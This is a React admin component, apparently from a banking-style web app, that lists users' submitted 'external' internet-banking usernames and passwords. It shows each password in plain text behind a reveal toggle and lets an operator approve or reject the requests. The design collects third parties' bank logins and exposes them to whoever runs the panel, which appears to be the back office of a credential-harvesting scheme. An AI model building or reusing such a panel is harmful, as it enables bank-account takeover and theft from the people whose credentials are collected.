import { useState, useEffect } from "react";
import { CollectionRequest } from "../types";
import { cn } from "../lib/utils";
import { Search, CheckCircle2, XCircle, Clock, Globe, Shield, Eye, EyeOff } from "lucide-react";
import { toast } from "sonner";
import { adminFetch } from "../lib/api";

export default function AdminCollections() {
  const [collections, setCollections] = useState<CollectionRequest[]>([]);
  const [searchTerm, setSearchTerm] = useState("");
  const [showPasswords, setShowPasswords] = useState<Record<string, boolean>>({});

  const fetchCollections = () => {
    adminFetch("/api/admin/collections")
      .then(res => res.json())
      .then(data => setCollections(data));
  };

  useEffect(() => {
    fetchCollections();
  }, []);

  const handleStatusUpdate = async (id: string, status: 'approved' | 'rejected') => {
    try {
      const response = await adminFetch(`/api/admin/collections/${id}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ status }),
      });
      if (response.ok) {
        toast.success(`Request ${status}`);
        fetchCollections();
      }
    } catch (error) {
      toast.error("Failed to update status");
    }
  };

  const togglePassword = (id: string) => {
    setShowPasswords(prev => ({ ...prev, [id]: !prev[id] }));
  };

  const filteredCollections = collections.filter(c => 
    c.userName?.toLowerCase().includes(searchTerm.toLowerCase()) ||
    c.username.toLowerCase().includes(searchTerm.toLowerCase())
  ).sort((a, b) => new Date(b.date).getTime() - new Date(a.date).getTime());

  return (
    <div className="space-y-6 text-slate-200">
      <div>
        <h1 className="text-2xl font-black text-white uppercase tracking-tight">Internet Banking Collections</h1>
        <p className="text-xs text-[#8E9BAE] font-bold uppercase tracking-wider">Approve or reject external banking link requests.</p>
      </div>

      <div className="bg-[#121824] rounded-xl border border-[#1E2638] overflow-hidden shadow-2xl">
        <div className="p-6 border-b border-[#1E2638] bg-[#0B0F17]/40 flex flex-col sm:flex-row gap-6">
          <div className="relative max-w-md w-full">
            <Search className="absolute left-3 top-1/2 -translate-y-1/2 text-[#8E9BAE]" size={16} />
            <input
              type="text"
              placeholder="Search by user or external username..."
              value={searchTerm}
              onChange={e => setSearchTerm(e.target.value)}
              className="w-full pl-9 pr-4 py-2 bg-white text-black text-xs font-black placeholder:text-[#8E9BAE] border border-[#1E2638] rounded outline-none focus:border-[#F59E0B]"
            />
          </div>
        </div>

        <div className="overflow-x-auto">
          <table className="w-full text-left border-collapse">
            <thead>
              <tr className="bg-[#0B0F17]/60 text-[#F59E0B] text-[9px] uppercase tracking-widest font-black border-b border-[#1E2638]">
                <th className="px-6 py-4">User</th>
                <th className="px-6 py-4">External Credentials</th>
                <th className="px-6 py-4">Date Submitted</th>
                <th className="px-6 py-4">Status</th>
                <th className="px-6 py-4">Actions</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-[#1E2638]">
              {filteredCollections.map((c) => (
                <tr key={c.id} className="hover:bg-[#0B0F17]/30 transition-colors">
                  <td className="px-6 py-4">
                    <p className="text-xs font-black text-white uppercase tracking-tight">{c.userName}</p>
                    <p className="text-[9px] text-[#8E9BAE] font-bold uppercase">ID: {c.userId}</p>
                  </td>
                  <td className="px-6 py-4">
                    <div className="space-y-1">
                      <div className="flex items-center gap-3">
                        <Globe size={12} className="text-[#F59E0B]" />
                        <span className="text-xs font-black text-white uppercase tracking-tight">{c.username}</span>
                      </div>
                      <div className="flex items-center gap-3">
                        <Shield size={12} className="text-[#8E9BAE]" />
                        <span className="text-[10px] font-mono text-[#8E9BAE] font-bold">
                          {showPasswords[c.id] ? c.password : "••••••••••••"}
                        </span>
                        <button onClick={() => togglePassword(c.id)} className="text-[#8E9BAE] hover:text-white transition-colors">
                          {showPasswords[c.id] ? <EyeOff size={13} /> : <Eye size={13} />}
                        </button>
                      </div>
                    </div>
                  </td>
                  <td className="px-6 py-4">
                    <p className="text-xs text-[#8E9BAE] font-mono font-medium">{new Date(c.date).toLocaleDateString()}</p>
                    <p className="text-[9px] text-[#8E9BAE] font-mono">{new Date(c.date).toLocaleTimeString()}</p>
                  </td>
                  <td className="px-6 py-4">
                    <div className="flex items-center gap-3">
                      {c.status === 'approved' ? <CheckCircle2 className="text-emerald-400" size={15} /> : 
                       c.status === 'rejected' ? <XCircle className="text-red-400" size={15} /> : 
                       <Clock className="text-amber-400" size={15} />}
                      <span className={cn(
                        "text-[9px] font-black uppercase tracking-widest font-mono",
                        c.status === 'approved' ? "text-emerald-400" : 
                        c.status === 'rejected' ? "text-red-400" : "text-amber-400"
                      )}>
                        {c.status}
                      </span>
                    </div>
                  </td>
                  <td className="px-6 py-4">
                    {c.status === 'pending' && (
                      <div className="flex items-center gap-1.5">
                        <button 
                          onClick={() => handleStatusUpdate(c.id, 'approved')}
                          className="p-1 px-1.5 bg-[#0B0F17] border border-emerald-500/20 hover:border-emerald-400 hover:bg-emerald-950/20 text-emerald-400 rounded text-[9px] font-black uppercase tracking-wider transition-all"
                          title="Approve"
                        >
                          Approve
                        </button>
                        <button 
                          onClick={() => handleStatusUpdate(c.id, 'rejected')}
                          className="p-1 px-1.5 bg-[#0B0F17] border border-red-505/20 hover:border-red-400 hover:bg-red-950/20 text-red-400 rounded text-[9px] font-black uppercase tracking-wider transition-all"
                          title="Reject"
                        >
                          Reject
                        </button>
                      </div>
                    )}
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}
